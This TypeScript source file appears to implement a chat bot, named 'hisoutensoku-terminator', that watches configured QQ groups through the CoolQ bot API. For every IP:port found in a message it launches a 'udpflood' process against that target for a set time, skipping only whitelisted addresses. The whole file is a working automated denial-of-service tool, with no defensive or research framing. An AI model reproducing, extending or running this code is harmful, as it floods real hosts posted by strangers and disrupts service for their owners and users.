import * as bunyan from "bunyan";
import * as fs from "fs";
import * as CQHttp from "cqhttp";
import * as _ from "underscore";
import * as yaml from "yaml";
import { spawn } from "child_process";
import * as os from "os";

interface CoolQConfig {
	apiRoot: string;
	accessToken: string;
	secret: string;
}

interface Config {
	address: string;
	port: number;
	coolq: CoolQConfig;
	floodQQGroups: Array<number>;
	attackTimeout: number;
	addressWhitelist: string[]
}

const log = bunyan.createLogger({
	name: "hisoutensoku-terminator"
});

let CoolQ: any, config: Config;

function sleep(time: number): Promise<void> {
	return new Promise((resolve, reject) => {
		setTimeout(resolve, time);
	});
};

function attack(address: string, port: number): Promise<void> {
	if (_.contains(config.addressWhitelist, address)) {
		log.info(`Attack of ${address}:${port} skipped.`);
		return new Promise((done) => {
			done();
		})
	}
	log.info(`Attack of ${address}:${port} started.`);
	const attackProcess = spawn("udpflood", ["-t", address, "-p", port.toString()]);
	setTimeout(() => {
		attackProcess.kill();
	}, config.attackTimeout);
	attackProcess.stdout.setEncoding("utf-8");
	attackProcess.stdout.on("data", (data) => {
		log.info(`${address}:${port} STDOUT =>`, data);
	});
	attackProcess.stderr.setEncoding("utf-8");
	attackProcess.stderr.on("data", (data) => {
		log.info(`${address}:${port} STDERR =>`, data);
	});
	return new Promise(done => {
		let check = false;
		attackProcess.on("exit", (code, signal) => {
			log.info(`Attack of ${address}:${port} exited.`);
			if (!check) {
				check = true;
				done();
			}
		});
		attackProcess.on("error", (error) => {
			log.info(`Attack of ${address}:${port} errored: ${error.message}`);
			if (!check) {
				check = true;
				done();
			}
		});
	});
}

async function messageHandler(data: any): Promise<void> {
	const groupID: number = data.group_id;
	if (!groupID || !_.contains(config.floodQQGroups, groupID)) {
		return;
	}
	const messageMatch: RegExpMatchArray = data.message.match(/(\d{1,3}(\.\d{1,3}){3}):(\d{1,5})/g);
	if (!messageMatch) {
		return;
	}
	const attackPromises = messageMatch.map(pattern => {
		const [address, portRaw] = pattern.split(":");
		const port = parseInt(portRaw);
		return attack(address, port);
	});
	await Promise.all(attackPromises);
}

async function main(): Promise<void> {
	config = yaml.parse(await fs.promises.readFile("./config.yaml", "utf8")) as Config;
	CoolQ = new CQHttp(config.coolq);
	CoolQ.on("message", messageHandler);
	CoolQ.listen(config.port, config.address);
 }
main();
